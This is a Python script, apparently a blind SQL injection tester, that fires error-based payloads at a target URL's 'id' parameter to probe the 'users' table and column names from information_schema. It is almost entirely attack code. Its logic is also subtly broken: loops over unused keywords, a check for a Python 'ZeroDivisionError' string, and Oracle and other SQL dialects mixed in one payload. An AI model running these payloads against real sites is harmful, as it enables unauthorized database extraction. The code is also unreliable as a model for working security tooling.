import requests
from bs4 import BeautifulSoup

def test_sql_injection(url):
    # Define a list of common database query keywords to use in the injection
    query_keywords = ['SELECT', 'FROM', 'WHERE', 'JOIN', 'LIMIT']

    # Define a list of characters to use in the content-based blind attack
    characters = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']

    # Define a dictionary of payloads to use in the content-based blind attack
    payloads = {
        "string_length": "';SELECT CASE WHEN (LENGTH((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0))={length}) THEN to_char(1/0) ELSE '' END FROM dual--",
        "string_value": "';SELECT CASE WHEN (SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0), {position}, 1)='{character}') THEN to_char(1/0) ELSE '' END FROM dual--",
        "integer_value": "';SELECT CASE WHEN ((SELECT COUNT(*) FROM users WHERE id={value})=1) THEN to_char(1/0) ELSE '' END FROM dual--"
    }

    # Add a single quote to the end of the URL to test for SQL injection
    url_injection = url + "'"

    # Loop over the query keywords, characters, and payloads to create a content-based blind payload
    for keyword in query_keywords:
        for char in characters:
            for payload_name, payload_value in payloads.items():
                if payload_name == "string_length":
                    for length in range(1, 100):
                        payload = payload_value.format(length=length)
                        r = requests.get(url_injection, params={'id': payload})
                        soup = BeautifulSoup(r.text, 'html.parser')
                        if 'ZeroDivisionError' in soup.text:
                            print(f"SQL injection vulnerability detected with payload: {payload_name}, query keyword: {keyword}, and length: {length}")
                            break
                    else:
                        print(f"No SQL injection vulnerabilities detected with payload: {payload_name} and query keyword: {keyword}")

                elif payload_name == "string_value":
                    for position in range(1, 100):
                        payload = payload_value.format(position=position, character=char)
                        r = requests.get(url_injection, params={'id': payload})
                        soup = BeautifulSoup(r.text, 'html.parser')
                        if 'ZeroDivisionError' in soup.text:
                            print(f"SQL injection vulnerability detected with payload: {payload_name}, query keyword: {keyword}, and character: {char}")
                            break
                    else:
                        print(f"No SQL injection vulnerabilities detected with payload: {payload_name} and query keyword: {keyword}")

                elif payload_name == "integer_value":
                    for value in range(1, 100):
                        payload = payload_value.format(value=value)
                        r = requests.get(url_injection, params={'id': payload})
                        soup = BeautifulSoup(r.text, 'html.parser')
                        if 'ZeroDivisionError' in soup.text:
                            print(f"SQL injection vulnerability detected with payload: {payload_name}, query keyword: {keyword}, and value: {value}")
                            break
                    else:
                        print(f"No SQL injection vulnerabilities detected with payload: {payload_name} and query keyword: {keyword}")
